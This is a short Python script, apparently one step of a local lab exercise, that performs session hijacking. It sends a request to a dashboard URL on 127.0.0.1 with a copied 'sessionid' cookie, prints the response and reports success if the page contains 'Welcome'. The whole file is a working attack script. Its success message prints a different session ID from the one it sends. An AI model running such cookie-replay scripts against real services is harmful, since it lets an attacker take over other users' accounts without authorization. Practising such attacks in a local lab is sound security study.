import requests

DASHBOARD_URL = "http://127.0.0.1:8000/dashboard/1/"  # Replace with the target user's ID

# 3️⃣ Session Hijacking - Using copied session ID
cookies = {"sessionid": "8965"}  # Replace with the copied session ID
response = requests.get(DASHBOARD_URL, cookies=cookies)
print(f"Response: {response.text}")  # Print the response text for debugging
if "Welcome" in response.text:
    print(f"[+] Session hijacking successful! sessionid=9999")
else:
    print("[-] Session hijacking failed.")